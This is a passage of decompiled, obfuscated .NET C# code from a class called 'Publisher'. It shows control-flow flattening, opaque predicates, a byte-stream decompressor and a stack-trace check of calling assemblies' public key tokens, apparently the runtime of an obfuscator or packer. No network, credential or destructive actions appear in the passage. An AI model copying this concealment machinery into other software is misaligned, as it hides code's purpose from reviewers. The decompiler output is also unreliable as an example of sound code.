      }
label_27:
      return str;
label_30:
      return str;
    }

    private static AssemblyName FlushObserver(Assembly v)
    {
      AssemblyName assemblyName;
      try
      {
        assemblyName = (AssemblyName) Publisher.ReadWrapper((object) v);
      }
      catch
      {
        assemblyName = new AssemblyName(v.FullName);
        int num1 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_7cfc2c03ff6649e2ad246e3cf4ba10a4 != 0)
          goto label_4;
label_3:
        switch (num1)
        {
          default:
            goto label_5;
        }
label_4:
        int num2;
        num1 = num2;
        goto label_3;
      }
label_5:
      return assemblyName;
    }

    private static byte[] DestroyObserver(AssemblyName key)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      byte[] numArray;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (numArray != null && numArray.Length == 0)
            {
              numArray = (byte[]) null;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0eea238500504729aee4edcf3eefb613 != 0)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_5;
          case 2:
            numArray = key.GetPublicKeyToken();
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1d907c9fd7d545a1b0574c801c287491 == 0)
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return numArray;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool FillObserver(StackTrace i, int startconnection)
    {
      StackFrame stackFrame = (StackFrame) Publisher.InsertWrapper((object) i, ++startconnection);
      if (stackFrame != null)
        goto label_3;
      else
        goto label_11;
label_1:
      int num1;
      int num2 = num1;
label_2:
      Assembly assembly1;
      while (true)
      {
        byte[] numArray;
        Assembly assembly2;
        switch (num2)
        {
          case 1:
            if (assembly1 != (Assembly) null && Publisher.CallWrapper((object) assembly1, (object) typeof (Publisher).Assembly))
            {
              num2 = 4;
              continue;
            }
            break;
          case 2:
            goto label_9;
          case 3:
            if (assembly1 != (Assembly) null)
            {
              numArray = Publisher.DestroyObserver((AssemblyName) Publisher.EnableWrapper((object) assembly1));
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_beca8b8d44734b91b46a32b91c7227f2 != 0)
              {
                num2 = 9;
                continue;
              }
              goto label_1;
            }
            else
              break;
          case 4:
            goto label_6;
          case 5:
            if (numArray[7] == (byte) 137)
            {
              num2 = 10;
              continue;
            }
            break;
          case 6:
            goto label_21;
          case 7:
            if (stackFrame != null)
            {
              MethodBase method = stackFrame.GetMethod();
              if ((object) method == null)
              {
                assembly2 = (Assembly) null;
                goto label_30;
              }
              else
              {
                Type declaringType = method.DeclaringType;
                if ((object) declaringType == null)
                {
                  num2 = 8;
                  continue;
                }
                assembly2 = declaringType.Assembly;
                goto label_30;
              }
            }
            else
              goto label_7;
          case 8:
            assembly2 = (Assembly) null;
            goto label_30;
          case 9:
            if (numArray != null)
              goto default;
            else
              break;
          case 10:
            goto label_16;
          default:
            if (numArray.Length == 8 && numArray[0] == (byte) 183)
            {
              num2 = 5;
              continue;
            }
            break;
        }
        stackFrame = (StackFrame) Publisher.InsertWrapper((object) i, ++startconnection);
        num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_48e34af45bd74ae5913f157377f42e5d == 0 ? 5 : 7;
        continue;
label_30:
        assembly1 = assembly2;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_105178fa900046e88d891529c2baf57a == 0)
          num2 = 1;
        else
          goto label_1;
      }
label_6:
      return true;
label_7:
      return false;
label_9:
      Assembly assembly3 = (Assembly) null;
      goto label_23;
label_16:
      return true;
label_21:
      assembly3 = (Assembly) null;
      goto label_23;
label_3:
      object obj = Publisher.SortWrapper((object) stackFrame);
      if (obj == null)
      {
        num2 = 6;
        goto label_2;
      }
      else
      {
        Type declaringType = ((MemberInfo) obj).DeclaringType;
        assembly3 = (object) declaringType == null ? (Assembly) null : declaringType.Assembly;
        goto label_23;
      }
label_11:
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_376cd90bc67442b2a023c2fa5704acea != 0)
      {
        num2 = 2;
        goto label_2;
      }
      else
        goto label_1;
label_23:
      assembly1 = assembly3;
      num1 = 3;
      goto label_1;
    }

    private static void AssetObserver(byte[] task, int reg_end, byte[] pool)
    {
      int num1 = 0;
      int num2 = 0;
      int num3 = 3;
      while (true)
      {
        int num4;
        int num5;
        int length;
        int num6;
        switch (num3)
        {
          case 1:
            if (num4 < 0)
              goto label_9;
            else
              goto label_13;
          case 2:
            num2 = (int) task[reg_end++];
            goto label_15;
          case 3:
            num5 = 128;
            length = pool.Length;
            num3 = 5;
            continue;
          case 4:
            num6 = ((int) task[reg_end] >> 2) + 3;
            int num7 = ((int) task[reg_end] << 8 | (int) task[reg_end + 1]) & 1023;
            reg_end += 2;
            num4 = num1 - num7;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_97cc72da7ae64d778adfa50a6ec06bdf != 0)
            {
              num3 = 1;
              continue;
            }
            break;
          case 5:
          case 10:
label_21:
            if (num1 >= length)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_03d940c5c72b4657afab7fdfc825d6a0 == 0)
              {
                num3 = 6;
                continue;
              }
              break;
            }
            goto case 8;
          case 6:
            goto label_6;
          case 7:
            goto label_18;
          case 8:
            if ((num5 <<= 1) == 256)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_a1af586aaaed4b5889ae7937389b0d13 == 0)
              {
                num3 = 9;
                continue;
              }
              break;
            }
            goto label_15;
          case 9:
            num5 = 1;
            num3 = 2;
            continue;
          case 11:
            pool[num1++] = pool[num4++];
            goto label_13;
          default:
            if (num1 < length)
            {
              num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_2985022a035a42c6bd2258b66c6b40c6 == 0 ? 11 : 2;
              continue;
            }
            goto case 5;
        }
label_1:
        int num8;
        num3 = num8;
        continue;
label_13:
        if (--num6 >= 0)
        {
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_9ceb7288d8474df683163482e13e6d4d == 0)
          {
            num3 = 0;
            continue;
          }
          goto label_1;
        }
        else
          goto label_21;
label_15:
        if ((num2 & num5) == 0)
        {
          pool[num1++] = task[reg_end++];
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8dc5aa4a1743454eaf4a55674886639c == 0)
            num3 = 10;
          else
            goto label_1;
        }
        else
          num3 = 4;
      }
label_6:
      return;
label_18:
      return;
label_9:;
    }

    internal static object SortWrapper([In] object obj0) => (object) ((StackFrame) obj0).GetMethod();

    internal static Type ConcatWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    internal static bool MapWrapper([In] object obj0, int startconnection) => Publisher.FillObserver((StackTrace) obj0, startconnection);

    internal static bool CollectWrapper() => Publisher.CustomizeWrapper == null;

    internal static Publisher LogoutWrapper() => Publisher.CustomizeWrapper;

    internal static object InstantiateWrapper() => (object) Assembly.GetExecutingAssembly();

    internal static object QueryWrapper() => (object) Assembly.GetCallingAssembly();

    internal static object PatchWrapper([In] object obj0, [In] char obj1) => (object) ((StringBuilder) obj0).Append(obj1);

    internal static object InsertWrapper([In] object obj0, [In] int obj1) => (object) ((StackTrace) obj0).GetFrame(obj1);

    internal static bool VerifyWrapper([In] Type obj0, [In] Type obj1) => obj0 == obj1;

    internal static short GetWrapper([In] object obj0) => ((Publisher.DicExceptionMock) obj0).VisitObserver();

    internal static long RateWrapper() => Policy.WriteObserver();

    internal static void PublishWrapper([In] object obj0) => ((IndexerErrorExpression) obj0).PublishObserver();

    internal static void ListWrapper([In] object obj0, [In] long obj1) => ((Stream) obj0).Position = obj1;

    internal static int FillWrapper([In] object obj0) => ((Publisher.DicExceptionMock) obj0).CreateObserver();

    internal static void CreateWrapper([In] object obj0) => Monitor.Exit(obj0);

    internal static void PopWrapper([In] object obj0, int reg_end, [In] object obj2) => Publisher.AssetObserver((byte[]) obj0, reg_end, (byte[]) obj2);

    internal static object NewWrapper() => (object) Encoding.Unicode;

    internal static void CloneWrapper([In] object obj0) => ((Publisher.DicExceptionMock) obj0).InterruptObserver();

    internal static object ReadWrapper([In] object obj0) => (object) ((Assembly) obj0).GetName();

    internal static object EnableWrapper([In] object obj0) => (object) Publisher.FlushObserver((Assembly) obj0);

    internal static bool CallWrapper([In] object obj0, [In] object obj1) => (Assembly) obj0 == (Assembly) obj1;

    private enum TranslationResult
    {
    }

    private sealed class DicExceptionMock
    {
      private Stream _Mock;
      private byte[] _Record;
      internal static Publisher.DicExceptionMock CancelWrapper;

      public DicExceptionMock(Stream i)
      {
        int num = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_168e88bedce74fe8bc918f876218b4f7 != 0)
          num = 0;
        switch (num)
        {
          default:
            this._Mock = i;
            this._Record = new byte[4];
            break;
        }
      }

      public Stream AwakeObserver() => this._Mock;

      public short VisitObserver()
      {
        this.ConcatObserver(2);
        return (short) ((int) this._Record[0] | (int) this._Record[1] << 8);
      }

      public int CreateObserver()
      {
        this.ConcatObserver(4);
        return (int) this._Record[0] | (int) this._Record[1] << 8 | (int) this._Record[2] << 16 | (int) this._Record[3] << 24;
      }

      private static void MapObserver() => throw new EndOfStreamException();

      private void ConcatObserver(int instancelow)
      {
        int num1 = 3;
label_1:
        int num2 = num1;
        int num3;
        while (true)
        {
          int offset;
          switch (num2)
          {
            case 1:
              goto label_3;
            case 2:
              if (instancelow == 1)
              {
                num3 = this._Mock.ReadByte();
                if (num3 == -1)
                {
                  num2 = 6;
                  continue;
                }
                goto label_3;
              }
              else
                break;
            case 3:
              offset = 0;
              num2 = 2;
              continue;
            case 4:
              if (num3 == 0)
              {
                Publisher.DicExceptionMock.ComputeWrapper();
                num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_dba176b596bd4473a90305bfa4f2ecb4 != 0 ? 0 : 0;
                continue;
              }
              goto default;
            case 5:
              goto label_14;
            case 6:
              Publisher.DicExceptionMock.MapObserver();
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_13b5edd003654e75a7a522140eef908b == 0)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            default:
              offset += num3;
              if (offset >= instancelow)
              {
                num2 = 5;
                continue;
              }
              break;
          }
          num3 = this._Mock.Read(this._Record, offset, instancelow - offset);
          num2 = 4;
        }
label_14:
        return;
label_3:
        this._Record[0] = (byte) num3;
      }

      public void InterruptObserver()
      {
        Stream mock = this._Mock;
        this._Mock = (Stream) null;
        int num1 = 1;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_4bcd64ac0ac74db186631b07daff7ebe != 0)
          goto label_2;
label_1:
        int num2;
        num1 = num2;
label_2:
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_7;
            case 1:
              if (mock != null)
              {
                mock.Close();
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d10e5279890341ec844a826edfc91e91 != 0)
                {
                  num1 = 2;
                  continue;
                }
                goto label_1;
              }
              else
                goto case 2;
            case 2:
              this._Record = (byte[]) null;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_52b6392ea2f24f9886f0e1c71b3be7b1 != 0)
              {
                num1 = 0;
                continue;
              }
              goto label_1;
            default:
              goto label_5;
          }
        }
label_7:
        return;
label_5:;
      }

      public byte[] InitObserver(int config)
      {
        byte[] buffer = config >= 0 ? new byte[config] : throw new ArgumentOutOfRangeException();
        int num1 = 3;
        int offset;
        byte[] numArray;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 1:
              if (offset != buffer.Length)
              {
                numArray = new byte[offset];
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8b8077f557054a4ab05eaafebde5d335 == 0)
                {
                  num1 = 4;
                  continue;
                }
                break;
              }
              goto label_15;
            case 2:
              config -= num2;
              if (config <= 0)
              {
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_a265fcf3c2a94205a89a5ad9f71dbf11 != 0)
                {
                  num1 = 1;
                  continue;
                }
                break;
              }
              goto default;
            case 3:
              offset = 0;
              num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_56e29fd300634669a35ee02619b6278d == 0 ? 0 : 0;
              continue;
            case 4:
              goto label_12;
            case 5:
              offset += num2;
              num1 = 2;
              continue;
            default:
              num2 = this._Mock.Read(buffer, offset, config);
              if (num2 != 0)
              {
                num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_aa4661ff09cf489fae9858435f69c5b9 == 0 ? 5 : 2;
                continue;
              }
              goto case 1;
          }
          int num3;
          num1 = num3;
        }
label_12:
        Publisher.DicExceptionMock.DestroyWrapper((object) buffer, 0, (object) numArray, 0, offset);
        buffer = numArray;
label_15:
        return buffer;
      }

      internal static bool VisitWrapper() => Publisher.DicExceptionMock.CancelWrapper == null;

      internal static Publisher.DicExceptionMock ForgotWrapper() => Publisher.DicExceptionMock.CancelWrapper;

      internal static void ComputeWrapper() => Publisher.DicExceptionMock.MapObserver();

      internal static void DestroyWrapper([In] object obj0, [In] int obj1, [In] object obj2, [In] int obj3, [In] int obj4) => Buffer.BlockCopy((Array) obj0, obj1, (Array) obj2, obj3, obj4);
    }
  }
}
